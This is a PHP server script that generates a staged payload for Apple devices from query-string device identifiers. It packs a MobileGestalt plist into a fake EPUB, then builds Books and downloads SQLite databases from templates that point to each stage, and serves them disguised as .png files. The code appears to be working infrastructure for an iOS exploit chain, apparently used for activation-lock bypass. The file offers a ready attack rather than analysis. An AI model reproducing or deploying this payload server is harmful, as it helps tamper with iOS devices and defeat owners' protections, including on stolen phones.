<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 0); 

function log_debug($msg, $level = 'INFO') {
    $timestamp = date('Y-m-d H:i:s');
    $line = "[$timestamp] [$level] $msg";
    error_log($line); 
}

// Function to generate random directory name
function generateRandomName($length = 16) {
    return bin2hex(random_bytes($length / 2));
}

// Function to read SQL dump from .png file
function readSQLDump($filename) {
    if (!file_exists($filename)) {
        log_debug("File not found: $filename", "ERROR");
        die("Error: File $filename not found");
    }
    return file_get_contents($filename);
}

// Function to create SQLite database from SQL dump
function createSQLiteFromDump($sqlDump, $outputFile) {
    try {
        $sqlDump = preg_replace_callback(
            "/unistr\s*\(\s*['\"]([^'\"]*)['\"]\\s*\)/i",
            function($matches) {
                $str = $matches[1];
                $str = preg_replace_callback(
                    '/\\\\([0-9A-Fa-f]{4})/',
                    function($m) {
                        return mb_convert_encoding(pack('H*', $m[1]), 'UTF-8', 'UCS-2BE');
                    },
                    $str
                );
                return "'" . str_replace("'", "''", $str) . "'";
            },
            $sqlDump
        );
        $sqlDump = preg_replace("/unistr\s*\(\s*(['\"][^'\"]*['\"])\s*\)/i", "$1", $sqlDump);
        
        $db = new SQLite3($outputFile);
        $statements = explode(';', $sqlDump);
        foreach ($statements as $statement) {
            $statement = trim($statement);
            if (!empty($statement) && strlen($statement) > 5) {
                @$db->exec($statement . ';');
            }
        }
        $db->close();
        return true;
    } catch (Exception $e) {
        log_debug("SQLite creation failed: " . $e->getMessage(), "ERROR");
        die("Error creating SQLite database");
    }
}

log_debug("=== STARTING PAYLOAD GENERATION ===");

$prd = $_GET['prd'] ?? '';
$guid = $_GET['guid'] ?? '';
$sn = $_GET['sn'] ?? '';

if (empty($prd) || empty($guid) || empty($sn)) {
    log_debug("Missing params: prd='$prd', guid='$guid', sn='$sn'", "ERROR");
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Missing prd, guid, or sn']);
    exit;
}

$prdFormatted = str_replace(',', '-', $prd);
$basePath = __DIR__;

$plistPath = "$basePath/Maker/$prdFormatted/com.apple.MobileGestalt.plist";
log_debug("Trying plist: $plistPath");

if (!file_exists($plistPath)) {
    $altPath1 = "$basePath/Maker/$prdFormatted/com.apple.MobileGestalt.plist";
    $altPath2 = $_SERVER['DOCUMENT_ROOT'] . "/bee33/Maker/$prdFormatted/com.apple.MobileGestalt.plist";
    
    if (file_exists($altPath1)) {
        $plistPath = $altPath1;
    } elseif (file_exists($altPath2)) {
        $plistPath = $altPath2;
    } else {
        log_debug("Plist not found. Tried: $plistPath, $altPath1, $altPath2", "ERROR");
        http_response_code(500);
        echo json_encode(['success' => false, 'error' => 'Plist not found']);
        exit;
    }
}

$realPlistPath = realpath($plistPath);
log_debug("✅ Using plist: $realPlistPath (size: " . filesize($realPlistPath) . " bytes)");


$randomName1 = generateRandomName();
$firstStepDir = "$basePath/firststp/$randomName1";
mkdir($firstStepDir, 0755, true);


$cachesDir = "$firstStepDir/Caches";
mkdir($cachesDir, 0755, true);


$tmpMimetype = "$cachesDir/mimetype";
file_put_contents($tmpMimetype, "application/epub+zip");

$zipPath = "$firstStepDir/temp.zip";
$zip = new ZipArchive();
if (!$zip->open($zipPath, ZipArchive::CREATE)) {
    log_debug("Failed to create ZIP", "ERROR");
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => 'ZIP creation failed']);
    exit;
}


if (!$zip->addFile($tmpMimetype, "Caches/mimetype")) {
    log_debug("Failed to add mimetype to ZIP", "ERROR");
    exit;
}
$zip->setCompressionName("Caches/mimetype", ZipArchive::CM_STORE); // ← КЛЮЧЕВО!

// Добавляем plist в Caches/
if (!$zip->addFile($plistPath, "Caches/com.apple.MobileGestalt.plist")) {
    log_debug("Failed to add plist to ZIP", "ERROR");
    exit;
}

$zip->close();


unlink($tmpMimetype);
rmdir($cachesDir);


$fixedFilePath = "$firstStepDir/fixedfile";
rename($zipPath, $fixedFilePath);
log_debug("✅ fixedfile (EPUB-compliant) created: $fixedFilePath");

// --- URLs ---
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] ? "https" : "http";
$baseUrl = "$protocol://$_SERVER[HTTP_HOST]";
$fixedFileUrl = "$baseUrl/firststp/$randomName1/fixedfile";

// --- Stage2: BLDatabaseManager.sqlite → belliloveu.png ---
$blDump = readSQLDump("$basePath/BLDatabaseManager.png");
$blDump = str_replace('KEYOOOOOO', $fixedFileUrl, $blDump);

$randomName2 = generateRandomName();
$secondStepDir = "$basePath/2ndd/$randomName2";
mkdir($secondStepDir, 0755, true);
$blSqlite = "$secondStepDir/BLDatabaseManager.sqlite";
createSQLiteFromDump($blDump, $blSqlite);
rename($blSqlite, "$secondStepDir/belliloveu.png");
$blUrl = "$baseUrl/2ndd/$randomName2/belliloveu.png";

// --- Stage3: downloads.28.sqlitedb → apllefuckedhhh.png ---
$dlDump = readSQLDump("$basePath/downloads.28.png");
$dlDump = str_replace('https://google.com', $blUrl, $dlDump);
$dlDump = str_replace('GOODKEY', $guid, $dlDump);

$randomName3 = generateRandomName();
$lastStepDir = "$basePath/last/$randomName3";
mkdir($lastStepDir, 0755, true);
$finalDb = "$lastStepDir/downloads.sqlitedb";
createSQLiteFromDump($dlDump, $finalDb);
rename($finalDb, "$lastStepDir/apllefuckedhhh.png");
$finalUrl = "$baseUrl/last/$randomName3/apllefuckedhhh.png";

log_debug("✅ All stages generated.");


echo json_encode([
    'success' => true,
    'parameters' => compact('prd', 'guid', 'sn'),
    'links' => [
        'step1_fixedfile' => $fixedFileUrl,
        'step2_bldatabase' => $blUrl,
        'step3_final' => $finalUrl
    ],
    'debug' => [
        'plist_used' => $realPlistPath,
        'plist_size' => filesize($realPlistPath)
    ]
], JSON_UNESCAPED_SLASHES | JSON_PRETTY_PRINT);
?>
